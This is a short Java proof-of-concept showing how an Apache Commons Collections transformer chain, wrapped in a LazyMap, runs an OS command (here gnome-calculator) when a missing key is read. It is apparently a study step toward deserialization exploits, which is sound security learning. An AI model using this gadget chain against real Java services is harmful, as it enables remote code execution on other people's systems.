import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class Concept10 {
    public static void main(String[] args) {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class},
                            new String[]{"/usr/bin/gnome-calculator"}),
            };

            Transformer chainedTransformer = new ChainedTransformer(transformers);

            Map hashMap = new HashMap();
            // Map lazyMap = LazyMap.decorate(hashMap, new MyReverse());
            Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

            String key = "invalid_key";
            // trying the add an entry to the HashMap
            lazyMap.get(key);  // this triggers the cmd execution
            System.out.println(hashMap);  // an entry wil be added into the HashMap

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
